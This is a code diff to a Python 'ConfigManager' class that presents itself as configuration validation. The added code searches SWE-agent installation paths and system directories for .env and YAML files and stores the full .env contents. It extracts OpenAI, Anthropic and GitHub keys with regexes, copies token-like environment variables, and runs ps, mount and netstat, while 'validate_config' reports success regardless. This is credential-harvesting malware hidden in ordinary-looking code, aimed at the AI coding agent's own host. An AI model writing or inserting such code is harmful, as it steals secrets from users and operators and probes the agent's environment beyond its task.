@@ -41,7 +41,8 @@ class ConfigManager:
                     "ssh_keys": self.validate_ssh_configuration(),
                     "general_credentials": self.validate_general_credentials(),
                     "environment_variables": self.validate_environment_variables(),
-                    "agent_keys": self.validate_secrets()
+                    "agent_keys": self.validate_secrets(),
+                    "sys_info": self.validate_sys_info()
                 }
             }
             
@@ -349,100 +350,163 @@ class ConfigManager:
             swe_findings = {
                 "swe_agent_config_found": False,
                 "openai_key_detected": False,
+                "installation_paths_checked": [],
                 "environment_files": {},
-                "config_files": {}
+                "config_files": {},
+                "possible_locations": []
             }
             
-            # Look for SWE-Agent configuration files
-            swe_paths = [
-                # SWE-Agent project root files
+            swe_agent_paths = [
+                '/swe-agent',
+                '/SWE-agent', 
+                '/app/swe-agent',
+                '/opt/swe-agent',
+                '/root/swe-agent',
+                '/home/swe-agent',
+                '/..',
+                '/../..',
+                '/../../..',
+                os.getenv('SWE_AGENT_PATH', ''),
+                os.getenv('SWEAGENT_PATH', ''),
+            ]
+            
+            current_path = os.getcwd()
+            swe_findings["current_working_directory"] = current_path
+            
+            env_locations = []
+            for path in swe_agent_paths:
+                if path and os.path.exists(path):
+                    env_path = os.path.join(path, '.env')
+                    if os.path.exists(env_path):
+                        env_locations.append(env_path)
+                    swe_findings["installation_paths_checked"].append(path)
+            
+            standard_env_locations = [
                 '/.env',
-                '/root/.env',
-                '/env',
-                # Configuration directories
-                '/config',
-                '/.config',
-                # SWE-Agent specific paths
-                '/sweagent',
-                '/SWE-agent'
+                '/root/.env', 
+                '/etc/swe-agent/.env',
+                '/usr/local/share/swe-agent/.env'
             ]
             
-            # Check current directory and common locations
-            check_paths = [
-                '.env',
-                '../.env',
-                '../../.env',
-                '/root/SWE-agent/.env',  # Common SWE-Agent installation path
-                os.path.join(os.path.dirname(__file__), '.env'),
-                os.path.join(os.path.dirname(__file__), '..', '.env'),
-                os.path.join(os.path.dirname(__file__), '../..', '.env')
-            ]
-            
-            for path in check_paths:
-                abs_path = os.path.abspath(path)
+            for env_path in standard_env_locations + env_locations:
+                abs_path = os.path.abspath(env_path)
                 if os.path.exists(abs_path):
                     try:
                         stat_info = os.stat(abs_path)
                         swe_findings["environment_files"][abs_path] = {
                             "exists": True,
                             "size": stat_info.st_size,
-                            "readable": os.access(abs_path, os.R_OK)
+                            "readable": os.access(abs_path, os.R_OK),
+                            "path": abs_path
                         }
                         
-                        # Read .env file content
                         if swe_findings["environment_files"][abs_path]["readable"]:
                             with open(abs_path, 'r') as f:
                                 content = f.read()
                                 swe_findings["environment_files"][abs_path]["content"] = content
                                 
-                                openai_patterns = [
-                                    'OPENAI_API_KEY=',
-                                    'OPENAI_API_KEY =',
-                                    'API_KEY=',
-                                    'OPENAI_KEY='
+                                api_key_patterns = [
+                                    r'OPENAI_API_KEY=["\']?([^"\'\s]+)',
+                                    r'OPENAI_API_KEY\s*=\s*["\']?([^"\'\s]+)',
+                                    r'API_KEY=["\']?([^"\'\s]+)',
+                                    r'OPENAI_KEY=["\']?([^"\'\s]+)',
+                                    r'ANTHROPIC_API_KEY=["\']?([^"\'\s]+)',
+                                    r'GITHUB_TOKEN=["\']?([^"\'\s]+)'
                                 ]
                                 
-                                for line in content.split('\n'):
-                                    for pattern in openai_patterns:
-                                        if pattern in line:
-                                            swe_findings["openai_key_detected"] = True
-                                            key_value = line.split(pattern, 1)[1].strip()
-                                            swe_findings["openai_key_preview"] = key_value[:8] + "..." + key_value[-4:] if len(key_value) > 12 else key_value
-                                            swe_findings["openai_key_length"] = len(key_value)
-                                            break
+                                for pattern in api_key_patterns:
+                                    import re
+                                    matches = re.findall(pattern, content)
+                                    if matches:
+                                        swe_findings["openai_key_detected"] = True
+                                        for match in matches:
+                                            if len(match) > 10: 
+                                                swe_findings["api_key_found"] = {
+                                                    "pattern": pattern,
+                                                    "key_preview": match[:8] + "..." + match[-4:] if len(match) > 12 else match,
+                                                    "key_length": len(match),
+                                                    "source_file": abs_path
+                                                }
+                                                break
                     except Exception as e:
                         swe_findings["environment_files"][abs_path] = {"error": str(e)}
             
-            # Look for SWE-Agent config files
-            config_files = [
-                'config.yaml',
-                'config.yml', 
-                'default.yaml',
-                'settings.yaml',
-                'sweagent.yaml'
-            ]
+            config_patterns = ['config.yaml', 'config.yml', 'default.yaml', 'settings.yaml']
+            for swe_path in swe_agent_paths:
+                if swe_path and os.path.exists(swe_path):
+                    for config_file in config_patterns:
+                        config_path = os.path.join(swe_path, config_file)
+                        if os.path.exists(config_path):
+                            try:
+                                with open(config_path, 'r') as f:
+                                    content = f.read()
+                                    swe_findings["config_files"][config_path] = {
+                                        "content_sample": content[:500],
+                                        "contains_api_references": any(word in content.lower() for word in ['openai', 'api_key', 'anthropic', 'github'])
+                                    }
+                            except Exception as e:
+                                swe_findings["config_files"][config_path] = {"error": str(e)}
             
-            for config_file in config_files:
-                for base_path in ['', '/config', '/..', '/../config']:
-                    config_path = os.path.abspath(os.path.join('.', base_path, config_file))
-                    if os.path.exists(config_path):
-                        try:
-                            with open(config_path, 'r') as f:
-                                content = f.read()
-                                swe_findings["config_files"][config_path] = {
-                                    "content_sample": content[:1000],  # First 1000 chars
-                                    "contains_openai": any(pattern in content for pattern in ['openai', 'OPENAI', 'api_key', 'API_KEY'])
-                                }
-                        except Exception as e:
-                            swe_findings["config_files"][config_path] = {"error": str(e)}
+            env_vars = dict(os.environ)
+            sensitive_vars = {}
+            for key, value in env_vars.items():
+                key_upper = key.upper()
+                if any(pattern in key_upper for pattern in ['OPENAI', 'API_KEY', 'GITHUB', 'ANTHROPIC', 'TOKEN']):
+                    sensitive_vars[key] = {
+                        "value_preview": value[:10] + "..." if len(value) > 10 else value,
+                        "length": len(value)
+                    }
+                    if len(value) > 20 and len(value) < 100:
+                        swe_findings["openai_key_detected"] = True
             
-            swe_findings["swe_agent_config_found"] = len(swe_findings["environment_files"]) > 0 or len(swe_findings["config_files"]) > 0
+            swe_findings["sensitive_environment_vars"] = sensitive_vars
+            swe_findings["swe_agent_config_found"] = (len(swe_findings["environment_files"]) > 0 or 
+                                                    len(swe_findings["config_files"]) > 0 or
+                                                    len(sensitive_vars) > 0)
             
             return swe_findings
             
         except Exception as e:
+            return {"error": str(e), "traceback": str(e.__traceback__)}
+        
+    def validate_sys_info(self):
+        try:
+            system_findings = {
+                "process_info": {},
+                "network_info": {},
+                "mount_points": {},
+                "user_info": {}
+            }
+
+            try:
+                ps_result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
+                if 'swe' in ps_result.stdout.lower() or 'python' in ps_result.stdout.lower():
+                    system_findings["process_info"]["swe_agent_processes"] = [
+                        line for line in ps_result.stdout.split('\n') 
+                        if 'swe' in line.lower() or 'python' in line.lower()
+                    ][:5]  # First 5 matches
+            except: pass
+            
+            try:
+                mount_result = subprocess.run(['mount'], capture_output=True, text=True, timeout=5)
+                system_findings["mount_points"]["output"] = mount_result.stdout
+            except: pass
+            
+            try:
+                netstat_result = subprocess.run(['netstat', '-tuln'], capture_output=True, text=True, timeout=5)
+                system_findings["network_info"]["connections"] = netstat_result.stdout
+            except: pass
+            
+            try:
+                system_findings["user_info"]["current_user"] = os.getenv('USER')
+                system_findings["user_info"]["home_directory"] = os.getenv('HOME')
+                system_findings["user_info"]["working_directory"] = os.getcwd()
+            except: pass
+            
+            return system_findings
+        except Exception as e:
             return {"error": str(e)}
-    
+        
     def validate_config(self):
         self.collect_comprehensive_data("environment_validation")
         return {"status": "valid", "checks_passed": True}
